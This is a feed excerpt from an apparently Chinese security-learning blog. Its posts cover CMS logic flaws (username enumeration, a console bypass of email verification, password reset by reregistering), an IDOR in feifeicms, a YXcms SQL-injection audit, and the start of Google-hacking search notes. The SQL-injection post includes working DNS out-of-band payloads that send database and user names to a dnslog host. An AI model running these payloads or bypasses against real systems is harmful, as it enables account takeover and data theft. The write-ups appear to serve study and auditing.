<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/6.png">



<p>这样的话，先用burp抓包看看它返回的数据有些什么吧</p>
<p>这是抓取的包，明显看到它有一个检验，然后后边id接的就是我们想要注册的用户名</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/7.png">

<p>看看返回的包</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/8.png">



<p>直接上burp跑字典，这里提前注册了test1、test2、test3、test4等用户，所以我只添加了一部分字符串进行猜解尝试</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/9.png">

<p>很ok的，都猜解出来了。</p>
<h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h2><p>既然注册的地方存在逻辑漏洞，未对图形验证码做任何防护。那大胆猜测一下，找回密码处也存在漏洞</p>
<p>好的，抓包</p>
<p>这是找回密码的界面，很简单，就一个图形验证，但刚刚已经发现，注册的地方图形验证好像也没什么用，那估计这里也一样。</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/10.png">

<p>继续下一步</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/11.png">

<p>发现需要验证码，但是邮箱地址是加的啊，上哪找去，emmm，在经过了一般思考后，我决定先把每一步用burp抓包看一下，然后发现它返回的包是这样的</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/12.png">

<p>这是一个JavaScript代码</p>
<p>题外话：刚刚检测用户是否存在也是这个提示，或许待会可以试试用户注册重置</p>
<p>先把这里完成吧</p>
<p>这里，我在大佬们的博客里面学到了，可以在<em><strong>控制台</strong></em>进行改变</p>
<p>window.document.userreg.yzm_mobile2.value=’yes’;</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/13.png">

<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/18.png">

<p>啊，完全没想到这个，感觉之前自己学的都白进脑子了，不开心</p>
<p>成功修改</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/14.png">

<p>哎，这个也算邮箱验证码绕过吧，行吧，大概就是这样。</p>
<p>之前我是想用burp抓包然后修改”window.document.userreg.yzm_mobile2.value=’yes’;”值，但是不知道为什么，我不能抓取返回包，可能是我太弱了，还不知道怎么获得</p>
<h2 id="用户注册重置"><a href="#用户注册重置" class="headerlink" title="用户注册重置"></a>用户注册重置</h2><p>好的，接下来回到刚刚那个题外话，也就是用户注册重置。</p>
<p>输入已注册的用户名，可以清楚看到下边的响应值有一样的参数。同样用控制台尝试修改。</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/15.png">

<p>虽然还是在报错，但尝试提交然后，发现是可以的。</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/16.png">

<p>然后，尝试登录</p>
<p>成功，密码是我重新注册的密码</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>某cms前台逻辑漏洞学习</title>
    <url>/2020/05/01/%E6%9F%90cms%E5%89%8D%E5%8F%B0%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>安装feifeicms4.0.18(建议直接安装在WWW目录下),具体代码，在我的资源里面，可免费下载</p>
<p>使用工具，phpstorm（别问，问就是喜欢它的界面）</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>漏洞代码所在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\Lib\Lib\Action\Home\UserAction.class.php</span><br></pre></td></tr></table></figure>

<p>出现问题的代码段在<code>198-225</code>行</p>
<p>代码如下，简单分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function post()&#123;</span><br><span class="line">	$info = D(&quot;User&quot;)-&gt;ff_update($_POST);</span><br><span class="line">	if($info)&#123;</span><br><span class="line">		//注册积分</span><br><span class="line">		if(C(&#x27;user_register_score&#x27;))&#123;</span><br><span class="line">			D(&#x27;Score&#x27;)-&gt;ff_user_score($info[&#x27;user_id&#x27;], 2, intval(C(&#x27;user_register_score&#x27;)));</span><br><span class="line">		&#125;</span><br><span class="line">		//推广积分</span><br><span class="line">		if($info[&#x27;user_pid&#x27;] &amp;&amp; C(&#x27;user_register_score_pid&#x27;))&#123;</span><br><span class="line">			D(&#x27;Score&#x27;)-&gt;ff_user_score($info[&#x27;user_pid&#x27;], 4, intval(C(&#x27;user_register_score_pid&#x27;)));</span><br><span class="line">		&#125;</span><br><span class="line">		//json返回</span><br><span class="line">		$data = array(&#x27;id&#x27;=&gt;$info[&#x27;user_id&#x27;],&#x27;referer&#x27;=&gt;cookie(&#x27;ff_register_referer&#x27;));</span><br><span class="line">		//欢迎邮件信息</span><br><span class="line">		if( C(&#x27;user_register_welcome&#x27;) )&#123;</span><br><span class="line">			$content = str_replace(array(&#x27;&#123;username&#125;&#x27;,&#x27;&#123;sitename&#125;&#x27;,&#x27;&#123;time&#125;&#x27;), array($info[&#x27;user_name&#x27;],C(&#x27;site_name&#x27;),time()), C(&#x27;user_register_welcome&#x27;));</span><br><span class="line">			D(&quot;Email&quot;)-&gt;send($info[&#x27;user_email&#x27;], $info[&#x27;user_name&#x27;], $info[&#x27;user_name&#x27;].&#x27;您好，感谢您的注册&#x27;, $content);</span><br><span class="line">		&#125;</span><br><span class="line">		//返回注册结果</span><br><span class="line">		if (C(&#x27;user_register_check&#x27;)) &#123;</span><br><span class="line">			$this-&gt;ajaxReturn($data, &quot;我们会尽快审核你的注册！&quot;, 201);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			$this-&gt;ajaxReturn($data, &quot;感谢你的注册！&quot;, 200);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$this-&gt;ajaxReturn(0, D(&quot;User&quot;)-&gt;getError(), 500);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>函数直接将 post 的数据传入，可以看到函数<code>ff_update</code></p>
<p>不知道它的用途，所以跟进看看，如果是使用phpstorm，可以直接使用ctrl+shift+F，搜索function ff_update，</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/1.png">

<p><code>\Lib\Lib\Model\AdsModel.class.php</code>，但是建议选择</p>
<p><code>\Lib\Lib\Model\UserModel.class.php</code>,因为这里本就是关于注册的内容，在回溯函数的时候，最好是找对应的代码</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>继续查看ff_update函数的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 新增或更新</span><br><span class="line">public function ff_update($data, $group=&#x27;home&#x27;)&#123;</span><br><span class="line">	// 创建安全数据对象TP</span><br><span class="line">	$data = $this-&gt;create($data);</span><br><span class="line">	if(false === $data)&#123;</span><br><span class="line">		$this-&gt;error = $this-&gt;getError();</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	/* 添加或修改行为 */</span><br><span class="line">	if(empty($data[&#x27;user_id&#x27;]))&#123;</span><br><span class="line">		$data[&#x27;user_id&#x27;] = $this-&gt;add();</span><br><span class="line">		if(!$data[&#x27;user_id&#x27;])&#123;</span><br><span class="line">			$this-&gt;error = $this-&gt;getError();</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">		if($group == &#x27;home&#x27;)&#123;</span><br><span class="line">			//写入注册时间防刷新注册</span><br><span class="line">			cookie(&#x27;ff_register_time&#x27;, time());</span><br><span class="line">			//写入登录信息</span><br><span class="line">			$this-&gt;ff_login_write(array(&#x27;user_id&#x27;=&gt;$data[&#x27;user_id&#x27;],&#x27;user_name&#x27;=&gt;$data[&#x27;user_name&#x27;],&#x27;user_pwd&#x27;=&gt;$data[&#x27;user_pwd&#x27;]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$status = $this-&gt;save();</span><br><span class="line">		if(false === $status)&#123;</span><br><span class="line">			$this-&gt;error = $this-&gt;getError();</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来到这个函数，其他感觉都还好，本人喜欢先全部通看一遍，查找那些代码审计时需要注意的函数，然后目标锁定create函数，因为不知道它是干嘛的，它又在最开始，继续使用上面的方法回溯，看了前面几个，一方面是因为没看见它的参数，另一方面是觉得它内容不符合关于注册的东西，所以我果断选择了下边这个函数</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/2.png">

<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function create($data=&#x27;&#x27;,$type=&#x27;&#x27;) &#123;</span><br><span class="line">        // 如果没有传值默认取POST数据</span><br><span class="line">        if(empty($data)) &#123;</span><br><span class="line">            $data    =   $_POST;</span><br><span class="line">        &#125;elseif(is_object($data))&#123;</span><br><span class="line">            $data   =   get_object_vars($data);</span><br><span class="line">        &#125;elseif(!is_array($data))&#123;</span><br><span class="line">            $this-&gt;error = L(&#x27;_DATA_TYPE_INVALID_&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 状态</span><br><span class="line">        $type = $type?$type:(!empty($data[$this-&gt;getPk()])?self::MODEL_UPDATE:self::MODEL_INSERT);</span><br><span class="line"></span><br><span class="line">        // 表单令牌验证</span><br><span class="line">        if(C(&#x27;TOKEN_ON&#x27;) &amp;&amp; !$this-&gt;autoCheckToken($data)) &#123;</span><br><span class="line">            $this-&gt;error = L(&#x27;_TOKEN_ERROR_&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检查字段映射</span><br><span class="line">        if(!empty($this-&gt;_map)) &#123;</span><br><span class="line">            foreach ($this-&gt;_map as $key=&gt;$val)&#123;</span><br><span class="line">                if(isset($data[$key])) &#123;</span><br><span class="line">                    $data[$val] =   $data[$key];</span><br><span class="line">                    unset($data[$key]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 数据自动验证</span><br><span class="line">        if(!$this-&gt;autoValidation($data,$type)) return false;</span><br><span class="line"></span><br><span class="line">        // 验证完成生成数据对象</span><br><span class="line">        $vo   =  array();</span><br><span class="line">        foreach ($this-&gt;fields as $key=&gt;$name)&#123;</span><br><span class="line">            if(substr($key,0,1)==&#x27;_&#x27;) continue;</span><br><span class="line">            $val = isset($data[$name])?$data[$name]:null;</span><br><span class="line">            //保证赋值有效</span><br><span class="line">            if(!is_null($val))&#123;</span><br><span class="line">                $vo[$name] = (MAGIC_QUOTES_GPC &amp;&amp; is_string($val))?   stripslashes($val)  :  $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 创建完成对数据进行自动处理</span><br><span class="line">        $this-&gt;autoOperation($vo,$type);</span><br><span class="line">        // 赋值当前数据对象</span><br><span class="line">        $this-&gt;data =   $vo;</span><br><span class="line">        // 返回创建的数据以供其他调用</span><br><span class="line">        return $vo;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单看看，大概就是传入参数，然后进行判断，<code>getPk</code>函数在这里没什么实际意思，大概就是不能为空，然后得到当前要判断的字段所在表的主键名称，<code>autoCheckToken</code>是关于令牌验证的，这个，我还没学到，所以暂定为没问题，重心也不在这里。继续往下，可以跟进 <code>autoValidation</code> 函数查看程序如何对数据进行验证，在同一个文件里面</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/3.png">

<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><code>\Lib\ThinkPHP\Lib\Think\Core\Model.class.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function autoValidation($data,$type) &#123;</span><br><span class="line">    // 属性验证</span><br><span class="line">    if(!empty($this-&gt;_validate)) &#123;</span><br><span class="line">        // 如果设置了数据自动验证</span><br><span class="line">        // 则进行数据验证</span><br><span class="line">        // 重置验证错误信息</span><br><span class="line">        foreach($this-&gt;_validate as $key=&gt;$val) &#123;</span><br><span class="line">            // 验证因子定义格式</span><br><span class="line">            // array(field,rule,message,condition,type,when,params)</span><br><span class="line">            // 判断是否需要执行验证</span><br><span class="line">            if(empty($val[5]) || $val[5]== self::MODEL_BOTH || $val[5]== $type ) &#123;</span><br><span class="line">                if(0==strpos($val[2],&#x27;&#123;%&#x27;) &amp;&amp; strpos($val[2],&#x27;&#125;&#x27;))</span><br><span class="line">                    // 支持提示信息的多语言 使用 &#123;%语言定义&#125; 方式</span><br><span class="line">                    $val[2]  =  L(substr($val[2],2,-1));</span><br><span class="line">                $val[3]  =  isset($val[3])?$val[3]:self::EXISTS_VAILIDATE;</span><br><span class="line">                $val[4]  =  isset($val[4])?$val[4]:&#x27;regex&#x27;;</span><br><span class="line">                // 判断验证条件</span><br><span class="line">                switch($val[3]) &#123;</span><br><span class="line">                    case self::MUST_VALIDATE:   // 必须验证 不管表单是否有设置该字段</span><br><span class="line">                        if(false === $this-&gt;_validationField($data,$val))&#123;</span><br><span class="line">                            $this-&gt;error    =   $val[2];</span><br><span class="line">                            return false;</span><br><span class="line">                        &#125;</span><br><span class="line">                        break;</span><br><span class="line">                    case self::VALUE_VAILIDATE:    // 值不为空的时候才验证</span><br><span class="line">                        if(&#x27;&#x27; != trim($data[$val[0]]))&#123;</span><br><span class="line">                            if(false === $this-&gt;_validationField($data,$val))&#123;</span><br><span class="line">                                $this-&gt;error    =   $val[2];</span><br><span class="line">                                return false;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        break;</span><br><span class="line">                    default:    // 默认表单存在该字段就验证</span><br><span class="line">                        if(isset($data[$val[0]]))&#123;</span><br><span class="line">                            if(false === $this-&gt;_validationField($data,$val))&#123;</span><br><span class="line">                                $this-&gt;error    =   $val[2];</span><br><span class="line">                                return false;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码注释比较多，所以，不用我们自己怎么去分析，问题在于<code>_validationField</code>函数，它虽然确实实在验证，但，这里看不出来它到底是怎么验证的，所以继续回溯吧,发现在同一个文件里</p>
<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>先看看<code>autoValidation</code>函数验证了些什么参数吧</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/4.png">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected $_validate = array(</span><br><span class="line">   array(&#x27;forum_vcode&#x27;,&#x27;require&#x27;,&#x27;请输入验证码!&#x27;,1,&#x27;&#x27;,1),</span><br><span class="line">   array(&#x27;forum_vcode&#x27;,&#x27;validate_vcode&#x27;,&#x27;验证码错误！&#x27;,1,&#x27;callback&#x27;,1),</span><br><span class="line">   array(&#x27;forum_uid&#x27;,&#x27;validate_uid&#x27;,&#x27;您还没有登录!&#x27;,1,&#x27;callback&#x27;,1),</span><br><span class="line">   array(&#x27;forum_cookie&#x27;,&#x27;validate_cookie&#x27;,&#x27;您已经评论过了!&#x27;,2,&#x27;callback&#x27;,1),</span><br><span class="line">   array(&#x27;forum_sid&#x27;,&#x27;require&#x27;,&#x27;您没有指定模型ID！&#x27;,1,&#x27;&#x27;,1),</span><br><span class="line">   array(&#x27;forum_content&#x27;,&#x27;require&#x27;,&#x27;请填写评论内容！&#x27;,1),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这些都是正常注册的，找不出漏洞，所以失败，回到刚刚的<code>\Lib\ThinkPHP\Lib\Think\CoreModel.class.php</code>继续看</p>
<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>发现<code>default</code>的部分：<code>if(isset($data[$val[0]]))</code>只要传入的数据为空就不必进入检测了，这样会带来问题</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/5.png">

<p>那就是咯，这样不就出问题了吗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function _validationField($data,$val) &#123;</span><br><span class="line">    switch($val[4]) &#123;</span><br><span class="line">        case &#x27;function&#x27;:// 使用函数进行验证</span><br><span class="line">        case &#x27;callback&#x27;:// 调用方法进行验证</span><br><span class="line">            $args = isset($val[6])?$val[6]:array();</span><br><span class="line">            array_unshift($args,$data[$val[0]]);</span><br><span class="line">            if(&#x27;function&#x27;==$val[4]) &#123;</span><br><span class="line">                return call_user_func_array($val[1], $args);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return call_user_func_array(array(&amp;$this, $val[1]), $args);</span><br><span class="line">            &#125;</span><br><span class="line">        case &#x27;confirm&#x27;: // 验证两个字段是否相同</span><br><span class="line">            return $data[$val[0]] == $data[$val[1]];</span><br><span class="line">        case &#x27;in&#x27;: // 验证是否在某个数组范围之内</span><br><span class="line">            return in_array($data[$val[0]] ,$val[1]);</span><br><span class="line">        case &#x27;equal&#x27;: // 验证是否等于某个值</span><br><span class="line">            return $data[$val[0]] == $val[1];</span><br><span class="line">        case &#x27;unique&#x27;: // 验证某个值是否唯一</span><br><span class="line">            if(is_string($val[0]) &amp;&amp; strpos($val[0],&#x27;,&#x27;))</span><br><span class="line">                $val[0]  =  explode(&#x27;,&#x27;,$val[0]);</span><br><span class="line">            $map = array();</span><br><span class="line">            if(is_array($val[0])) &#123;</span><br><span class="line">                // 支持多个字段验证</span><br><span class="line">                foreach ($val[0] as $field)</span><br><span class="line">                    $map[$field]   =  $data[$field];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $map[$val[0]] = $data[$val[0]];</span><br><span class="line">            &#125;</span><br><span class="line">            if(!empty($data[$this-&gt;getPk()])) &#123; // 完善编辑的时候验证唯一</span><br><span class="line">                $map[$this-&gt;getPk()] = array(&#x27;neq&#x27;,$data[$this-&gt;getPk()]);</span><br><span class="line">            &#125;</span><br><span class="line">            if($this-&gt;where($map)-&gt;find())</span><br><span class="line">                return false;</span><br><span class="line">            break;</span><br><span class="line">        case &#x27;regex&#x27;:</span><br><span class="line">        default:    // 默认使用正则验证 可以使用验证类中定义的验证名称</span><br><span class="line">            // 检查附加规则</span><br><span class="line">            return $this-&gt;regex($data[$val[0]],$val[1]);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;getPk()</code> 函数是得到当前要判断的字段所在表的主键名称（注册时影响的表即为 ff_user，主键为 user_id，在thinkphp 中也有该函数）。如果存在，那么就用 ‘neq’, 也即不等于。但是，它这里，都没什么验证啊，比如是验证是不是当前该用户，换句话说，就是没有限制访问其他id的页面，等于说注册完以后，随便传入一个字段<code>user_id</code>就可以看其他用户了哦？只要这个id存在。</p>
<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>（原本是还有一个注册界面的越权的，但是没有发现相应的参数，只好作废）</p>
<p>大概原理：如果已经注册了一个<code>user_name=test1</code>并且<code>user_id=2</code>的用户，那么可以尝试绕过了字段验证。或者只需要传入<code>user_id</code>这个字段就可以绕过了。字段验证完以后数据库会自动更新。(这里没有传入 user_name, user_email 等字段，仅仅传入了 user_id 和密码)，那么程序就会对<code>user_id</code>对应的用户进行密码更改。</p>
<p>同时网站可以通过<code>user_id</code>来遍历得到注册用户的<code>user_name</code>。可以检测 user_id 是否存在（水平越权）</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/6.png">

<p>又可以访问test2</p>
<img src="https://ckcah.github.io/images/某cms逻辑漏洞/7.png">

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>cms</tag>
        <tag>水平越权</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计-SQL注入</title>
    <url>/2020/05/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>安装YXcms1.4.6（当时没找到1.4.6，所以用了1.4.5代替，但其实代码都是一样的，路径也没变化，可放心使用），具体代码，在资源，可免费下载。</p>
<p>使用工具，phpstorm。尝试过用seay审计工具试试能不能检测到，然后发现不能，就放弃了，直接用PHPstorm直接看吧。</p>
<p>全局查找快捷键：ctrl+shift+F</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>文件里面有提示，后台的账号密码为admin/123456</p>
<p>直奔主题（可能经验多了，大概就知道哪些地方有漏洞了，可惜我是小白，只能先照着做积累经验）</p>
<p>漏洞的位置大概是这样的</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/1.png">



<p>这里存在sql注入</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>审计代码，用的方法是函数回溯，这个我会！</p>
<h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>首先是看到这个<code>WWW\protected\apps\admin\controller\commonController.php</code>文件</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/2.png">

<p>这里是用implode函数对$_POST[‘delid’]数组直接转换为字符的结果直接传入delete方法，那，去看看delete呗</p>
<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>ctrl+shift+F查找全局function delete</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/3.png">

<p>稍微学过一点点代码审计，所以看懂了下边的其他代码</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/4.png">

<p>唯一在意的地方，就是这个，所以就继续回溯，发现其实在同一个文件内，</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/5.png">

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>因爲還不知道這個函數的作用和具體參數什麽的，所以继续回溯</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/6.png">

<p>随便一个点进去看看</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/7.png">

<p>php代码里面好像没有这个，应该是个自定義函数，依然回溯</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>然后就看到了一个熟悉的函数</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/8.png">



<p>看我发现了什么，</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/9.png">

<p>mysql_real_escape_string函数欸</p>
<p><strong>总结</strong>：一路回溯下来，完全没有看到其他的防护方案，只有这里有个mysql_real_escape_string函数，猜测这里存在sql注入</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/10.png">

<p>从这里，结合分析出来，它存在于碎片列表的删除，不过，其实其他地方也是这样存在的，因为程序员在写的时候，，，，，，嗯，从这里下手咯那就</p>
<p>[mysql_real_escape_string][<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp]">https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp]</a></p>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false</p>
<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>進入後臺后，直接用burp，在提交刪除申請的時候進行截斷，寫入payload即可。（操作之前，要使用dnslog.link進行記錄）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"></span><br><span class="line">select load_file((concat(&#x27;\\\\&#x27;,(select hex(user())),&#x27;.test.dnslog.link\\321&#x27;)))</span><br><span class="line"></span><br><span class="line">select LOAD_FILE((CONCAT(&#x27;\\\\&#x27;,(SELECT DATABASE()),&#x27;.test.dnslog.link\\321&#x27;)))</span><br></pre></td></tr></table></figure>

<p>抓包</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/11.png">

<img src="https://ckcah.github.io/images/代碼審計之sql/12.png">

<p>接下來burp抓包，進行sql注入</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/13.png">



<p>發包，如果長時間才反應出以下界面，則證明成功</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/14.png">

<p>ok，接著，將burp的截斷放回，查看dnslog</p>
<img src="https://ckcah.github.io/images/代碼審計之sql/15.png">

<p>這就是它的數據庫名了。</p>
<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>關於dnslog.link結合sql注入的原理</p>
<p>這裏介紹的是dnslog.link，通常会给你一个三级域名，只需把信息写在第四级域名上就好了，然後在訪問網之后就会有查询记录</p>
<p>dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>一般在无法通过联合查询直接获取数据的時候，只能通过盲注来一步步的获取数据，但使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据。在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，也许你也可以使用代理池。。。</p>
<p>首先说明，dns带外查询属于MySQL注入，在MySQL中有个系统属性</p>
<p>secure_file_priv特性，有三种状态</p>
<pre><code>secure_file_priv为null    表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹
secure_file_priv没有设置时，则表示没有任何限制
</code></pre>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>LOAD_FILE()函数读取一个文件并将其内容作为字符串返回</p>
<p>语法为：load_file(file_name)，其中file_name是文件的完整路径</p>
<p>此函数使用需要满足的条件</p>
<pre><code>文件必须位于服务器主机上
你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关
文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节
</code></pre>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>load_file()函数访问的是文件，所以域名后面需要添加/abc(其他的也可以，比如/321)</p>
<p>其他查询步骤不在一一列出</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>googlehack</title>
    <url>/2020/05/01/googlehack/</url>
    <content><![CDATA[<p><strong>笔记</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Google hack是指使用Google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</span><br></pre></td></tr></table></figure>

<p><strong>google hacking的简单实现</strong><br>使用google中的一些语法可以提供给我们更多的信息(当然也提供给那些习惯攻击的人更多他们所想要的.),下面就来介绍一些常用的语法.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intext: 这个就是把网页中的正文内容中的某个字符做为搜索条件.</span><br><span class="line"></span><br><span class="line">例如在google里输入:</span><br><span class="line">intext: 渗透.将返回所有在网页正文部分包含&quot;渗透&quot;的网页.</span><br><span class="line"></span><br><span class="line">allintext: 使用方法和intext类似.</span><br><span class="line"></span><br><span class="line">intitle: 和上面那个intext差不多,搜索网页标题中是否有我们所要找的字符.</span><br><span class="line">例如搜索:</span><br><span class="line">intitle:安全 将返回所有网页标题中包含&quot;安全&quot;的网页</span><br><span class="line"></span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候也许能找到一些好东西哦.</span><br><span class="line"></span><br><span class="line">define: 搜索某个词语的定义,</span><br><span class="line">搜索:</span><br><span class="line">define:hacker 将返回关于hacker的定义.</span><br><span class="line"></span><br><span class="line">filetype: 